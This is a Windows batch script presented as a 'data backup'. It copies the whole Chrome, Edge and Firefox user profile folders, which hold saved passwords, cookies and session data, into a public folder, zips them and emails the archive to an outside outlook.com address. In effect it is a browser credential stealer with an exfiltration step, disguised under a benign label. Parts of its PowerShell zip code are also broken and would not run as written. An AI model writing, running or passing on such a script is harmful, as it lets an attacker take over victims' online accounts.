@echo off
set publicDocsFolder=C:\Users\Public\Documents
set emailRecipient=ccoppoletta@outlook.com
set emailSubject="Data backup"

echo Copying Chrome data...
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data" "%publicDocsFolder%\Chrome Data" /E /I /Y

echo Copying Edge data...
xcopy "%LOCALAPPDATA%\Microsoft\Edge\User Data" "%publicDocsFolder%\Edge Data" /E /I /Y

echo Copying Firefox data...
xcopy "%APPDATA%\Mozilla\Firefox\Profiles" "%publicDocsFolder%\Firefox Data" /E /I /Y

echo Creating data.zip file...
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nologo -noprofile -command "& { Add-Type -assembly 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory('%publicDocsFolder%\Chrome Data', '%publicDocsFolder%\data.zip'); [IO.Compression.ZipFile]::Extensions = [IO.Compression.ZipArchiveExtensions]::ExplicitEntriesOnly; [IO.Compression.ZipFile]::CreateFromDirectory('%publicDocsFolder%\Edge Data', '%publicDocsFolder%\data.zip'); [IO.Compression.ZipFile]::Extensions = [IO.Compression.ZipArchiveExtensions]::ExplicitEntriesOnly; [IO.Compression.ZipFile]::CreateFromDirectory('%publicDocsFolder%\Firefox Data', '%publicDocsFolder%\data.zip'); }"

echo Sending email...
powershell -command "Send-MailMessage -To '%emailRecipient%' -Subject %emailSubject% -Body 'Data backup attached.' -Attachments '%publicDocsFolder%\data.zip'"

echo Data backup complete.
pause
